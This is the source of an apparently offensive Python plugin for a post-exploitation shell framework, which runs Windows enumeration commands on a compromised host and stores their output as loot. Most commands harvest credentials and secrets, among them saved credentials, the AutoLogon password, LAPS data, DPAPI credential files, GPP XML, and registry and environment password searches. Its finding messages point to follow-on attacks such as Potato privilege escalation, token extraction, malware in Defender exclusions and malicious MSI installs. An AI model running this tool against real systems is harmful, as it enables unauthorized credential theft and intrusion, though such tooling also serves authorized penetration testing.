#!/usr/bin/env python3
"""
NexShell Plugin — Auto Enum Windows v3.0 (2026 Edition)
Full post-exploitation enumeration for Windows targets via CMD/PowerShell/CIM.

Collects: Identity, Entra ID, OS/Build (CVE checks), Defender/EDR, LAPS, 
AutoLogon, DPAPI, GPP, AppLocker/WDAC, BitLocker, RDP, Network, Services.

Usage:
    (NexShell)> plugins run auto-enum-windows
    (NexShell)> plugins run auto-enum-windows --ps   (prefer PowerShell/CIM)
"""

import re
from core.plugin import NexPlugin


class AutoEnumWindows(NexPlugin):
    name        = "auto-enum-windows"
    description = "Modern Windows post-exploitation enumeration (2025/2026 threats)"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "windows"
    category    = "recon"
    mitre_id    = "T1082"

    # ── CMD commands (Legacy & Fallback) ──────────────────────────────────────
    CMD_COMMANDS = [
        # Identity & Cloud
        ("whoami /all", "credentials", "whoami", "Current User + Privileges"),
        ("dsregcmd /status", "credentials", "dsreg", "Entra ID / Azure AD Status"),
        
        # OS & Build (CVE Checks)
        ("systeminfo", "custom", "sysinfo", "System Info"),
        ("ver", "custom", "os_ver", "OS Version"),
        
        # Users & Groups
        ("net user", "credentials", "users", "Local Users"),
        ("net localgroup administrators", "credentials", "admins", "Administrators Group"),
        
        # Network & RDP
        ("ipconfig /all", "network", "ipconfig", "Network Config"),
        ("netstat -ano", "network", "netstat", "Active Connections"),
        ("reg query \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication", "network", "rdp_nla", "RDP NLA Status"),
        
        # Credentials & Secrets
        ("cmdkey /list", "credentials", "cmdkey", "Saved Credentials"),
        ("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword", "credentials", "autologon", "AutoLogon Password"),
        ("reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\LAPS\" /s", "credentials", "laps_reg", "Windows LAPS Registry"),
        ("dir /s /b C:\\ProgramData\\Microsoft\\Group Policy\\History\\*\\Machine\\Preferences\\Groups\\Groups.xml 2>nul", "credentials", "gpp_xml", "Group Policy Preferences XML"),
        ("dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul", "credentials", "dpapi_local", "DPAPI Local Credentials"),
        ("dir /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\* 2>nul", "credentials", "dpapi_roaming", "DPAPI Roaming Credentials"),
        ("reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password", "credentials", "reg_pass", "Registry Passwords"),
        ("set | findstr /i \"pass key secret token api aws azure\"", "credentials", "env_secrets", "Env Secrets"),
        
        # Services & Processes (Fallback to sc/tasklist if CIM fails)
        ("sc query type= all state= all", "custom", "services", "All Services"),
        ("tasklist /v", "custom", "processes", "Running Processes"),
        ("Get-Service Spooler | Select-Object Status, StartType", "custom", "spooler", "Print Spooler Status"),
        
        # AV / EDR / AppLocker
        ("sc query WinDefend", "custom", "defender", "Windows Defender Service"),
        ("powershell -c \"Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue | Select-Object -ExpandProperty RuleCollections\"", "custom", "applocker", "AppLocker Policy"),
        
        # BitLocker
        ("manage-bde -status", "custom", "bitlocker", "BitLocker Status"),
        
        # AlwaysInstallElevated
        ("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul", "privesc", "alwaysinstall", "AlwaysInstallElevated HKCU"),
        ("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul", "privesc", "alwaysinstall2", "AlwaysInstallElevated HKLM"),
        
        # WSUS
        ("reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /s", "custom", "wsus", "WSUS Config"),
    ]

    # ── PowerShell / CIM commands (Modern & Richer) ───────────────────────────
    PS_COMMANDS = [
        # Identity & Cloud
        ("whoami /all", "credentials", "whoami", "Current User + Privileges"),
        ("dsregcmd /status", "credentials", "dsreg", "Entra ID / Azure AD Status"),
        
        # OS & Build
        ("Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber | Format-List", "custom", "cim_os", "OS Info (CIM)"),
        ("(Get-CimInstance Win32_OperatingSystem).BuildNumber", "custom", "build_num", "OS Build Number"),
        
        # Users & Groups
        ("Get-LocalUser | Select-Object Name,Enabled,PasswordRequired | Format-Table", "credentials", "ps_users", "Local Users (PS)"),
        ("Get-LocalGroupMember Administrators | Format-Table", "credentials", "ps_admins", "Administrators (PS)"),
        
        # Defender & EDR
        ("Get-MpPreference | Select-Object DisableRealtimeMonitoring, ExclusionPath, ExclusionProcess, ExclusionExtension | Format-List", "custom", "defender_prefs", "Defender Preferences"),
        ("Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, BehaviorMonitorEnabled | Format-List", "custom", "defender_status", "Defender Status"),
        
        # LAPS & AutoLogon
        ("Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\LAPS -ErrorAction SilentlyContinue", "credentials", "laps_ps", "Windows LAPS (PS)"),
        ("Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' | Select-Object DefaultUserName, DefaultPassword, AutoAdminLogon", "credentials", "autologon_ps", "AutoLogon (PS)"),
        
        # DPAPI & GPP
        ("Get-ChildItem -Path C:\\ProgramData\\Microsoft\\Group Policy\\History -Recurse -Filter 'Groups.xml' -ErrorAction SilentlyContinue | Select FullName", "credentials", "gpp_xml_ps", "GPP XML Files (PS)"),
        ("Get-ChildItem -Path C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials -Recurse -ErrorAction SilentlyContinue | Select FullName", "credentials", "dpapi_local_ps", "DPAPI Local (PS)"),
        
        # AppLocker & WDAC
        ("Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue", "custom", "applocker_ps", "AppLocker Policy (PS)"),
        ("Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue | Select-Object CodeIntegrityPolicyEnforcementStatus", "custom", "wdac_ps", "WDAC Status (PS)"),
        
        # Network & RDP
        ("Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess | Format-Table", "network", "tcp_listen", "Listening Ports (PS)"),
        ("Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -ErrorAction SilentlyContinue | Select-Object UserAuthentication", "network", "rdp_nla_ps", "RDP NLA (PS)"),
        
        # Services & Processes
        ("Get-CimInstance -ClassName Win32_Service | Select-Object Name, PathName, StartMode, State | Format-Table", "custom", "cim_svc", "Services (CIM)"),
        ("Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table", "custom", "ps_proc", "Top Processes (PS)"),
        ("Get-ScheduledTask | Where-Object State -ne Disabled | Select-Object TaskName,TaskPath | Format-Table", "custom", "ps_tasks", "Scheduled Tasks (PS)"),
        ("Get-Service Spooler | Select-Object Status, StartType", "custom", "spooler_ps", "Print Spooler Status (PS)"),
        
        # BitLocker
        ("Get-BitLockerVolume | Select-Object MountPoint, VolumeStatus, ProtectionStatus | Format-Table", "custom", "bitlocker_ps", "BitLocker Status (PS)"),
        
        # AlwaysInstallElevated
        ("Get-ItemProperty HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -ErrorAction SilentlyContinue | Select-Object AlwaysInstallElevated", "privesc", "alwaysinstall_ps", "AlwaysInstallElevated HKCU (PS)"),
        ("Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -ErrorAction SilentlyContinue | Select-Object AlwaysInstallElevated", "privesc", "alwaysinstall2_ps", "AlwaysInstallElevated HKLM (PS)"),
        
        # WSUS
        ("Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -ErrorAction SilentlyContinue", "custom", "wsus_ps", "WSUS Config (PS)"),
    ]

    # ── Auto-finding patterns ─────────────────────────────────────────────────
    FINDING_PATTERNS = {
        "whoami": [
            (r"SeDebugPrivilege\s+Enabled", "Critical", "SeDebugPrivilege Enabled",
             "SeDebugPrivilege is enabled — user can inject into SYSTEM processes."),
            (r"SeImpersonatePrivilege\s+Enabled", "High", "SeImpersonatePrivilege Enabled",
             "SeImpersonatePrivilege enabled — JuicyPotato/RoguePotato attacks likely possible."),
            (r"SeBackupPrivilege\s+Enabled", "High", "SeBackupPrivilege Enabled",
             "SeBackupPrivilege enabled — can read SAM/SYSTEM registry hives."),
            (r"SeLoadDriverPrivilege\s+Enabled", "High", "SeLoadDriverPrivilege Enabled",
             "SeLoadDriverPrivilege enabled — can load vulnerable kernel drivers."),
        ],
        "dsreg": [
            (r"AzureAdJoined\s*:\s*YES", "High", "Entra ID (Azure AD) Joined Device",
             "Device is joined to Entra ID. Check for PRT (Primary Refresh Token) extraction for cloud persistence."),
            (r"WorkplaceJoined\s*:\s*YES", "Info", "Entra ID Workplace Joined Device",
             "Device is workplace joined. May have conditional access policies or cached tokens."),
        ],
        "defender_prefs": [
            (r"ExclusionPath\s*:\s*\{(.+)\}", "High", "Windows Defender Path Exclusions Found",
             "Defender has path exclusions configured. These directories can be used to drop malware."),
            (r"ExclusionProcess\s*:\s*\{(.+)\}", "High", "Windows Defender Process Exclusions",
             "Defender has process exclusions. These processes can execute malicious code unchecked."),
            (r"DisableRealtimeMonitoring\s*:\s*True", "Critical", "Defender Real-Time Monitoring Disabled",
             "Real-time monitoring is disabled. Endpoint is largely unprotected."),
        ],
        "autologon_ps": [
            (r"DefaultPassword\s*:\s*\S+", "Critical", "AutoLogon Password Found",
             "Windows AutoLogon is configured with a plaintext password in the registry."),
        ],
        "laps_ps": [
            (r"Password\s*:\s*\S+", "High", "Windows LAPS Password in Registry",
             "Windows LAPS password found in local registry. Can be used for lateral movement."),
        ],
        "gpp_xml_ps": [
            (r"cpassword", "High", "Group Policy Preferences (GPP) Password Found",
             "GPP XML contains a 'cpassword' attribute. Can be decrypted with known AES key to reveal plaintext password."),
        ],
        "applocker_ps": [
            (r"EnforceMode\s*:\s*None", "Medium", "AppLocker Not Configured or Audit Only",
             "AppLocker is not enforced. No application whitelisting is preventing execution of malicious binaries."),
        ],
        "wdac_ps": [
            (r"CodeIntegrityPolicyEnforcementStatus\s*:\s*Off", "Medium", "WDAC Not Enforced",
             "Windows Defender Application Control (WDAC) is not enforcing policies."),
        ],
        "bitlocker_ps": [
            (r"ProtectionStatus\s*:\s*Off", "Medium", "BitLocker Protection Disabled",
             "BitLocker is suspended or off on some volumes. Data is unencrypted at rest."),
        ],
        "alwaysinstall_ps": [
            (r"AlwaysInstallElevated\s*:\s*1", "High", "AlwaysInstallElevated Enabled",
             "AlwaysInstallElevated is set. Malicious MSI packages can be installed with SYSTEM privileges."),
        ],
        "build_num": [
            (r"^\s*(19045|22621|22631|17763|20348)\s*$", "Medium", "Potentially Vulnerable OS Build (CVE-2024-38063)",
             "OS build matches versions affected by CVE-2024-38063 (Windows TCP/IP RCE). Verify minor build number and patch status."),
        ],
        "spooler_ps": [
            (r"Status\s*:\s*Running", "Medium", "Print Spooler Service Running",
             "Print Spooler is running. Historically vulnerable to PrintNightmare and other RCEs. Ensure patched."),
        ],
        "wsus_ps": [
            (r"WUServer\s*:\s*http://", "Medium", "WSUS Over HTTP Detected",
             "WSUS is configured to use HTTP instead of HTTPS. Susceptible to MITM attacks for fake updates."),
        ],
    }

    def run(self, session, args: list):
        use_ps = '--ps' in (args or [])
        save_only = '--save-only' in (args or [])

        self.info("Starting auto-enum-windows v3.0 (2026 Edition) ...")
        sections = []
        collected = {}

        commands = self.PS_COMMANDS if use_ps else self.CMD_COMMANDS

        for cmd_data in commands:
            cmd, loot_cat, fkey, label = cmd_data
            try:
                run_cmd = f"powershell -NonInteractive -Command \"{cmd}\"" if use_ps else cmd
                out = self._exec(session, run_cmd)
                if not out.strip():
                    continue

                if fkey:
                    collected[fkey] = out

                self.loot(out, category=loot_cat, source=f"auto-enum-win:{cmd[:40]}")

                if not save_only:
                    sections.append(f"\n{'━'*64}")
                    sections.append(f"  [{label}]")
                    sections.append('━'*64)
                    sections.append(out.strip()[:800])

            except Exception as e:
                self.warn(f"Cmd failed: {cmd[:40]}: {e}")

        # ── Auto-findings ─────────────────────────────────────────────────────
        findings_created = 0
        for fkey, patterns in self.FINDING_PATTERNS.items():
            text = collected.get(fkey, '')
            for pattern, severity, title, recommendation in patterns:
                if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                    self.finding(
                        title=title, description=f"{text[:400]}",
                        severity=severity, recommendation=recommendation,
                        mitre_id=self.mitre_id,
                    )
                    self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                    findings_created += 1

        self.info(f"auto-enum-windows complete — {findings_created} findings created.")
        return '\n'.join(sections) if sections else "(save-only: output saved to loot)"

    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, (str, bytes)):
                    return result.decode(errors='replace') if isinstance(result, bytes) else result
        return ''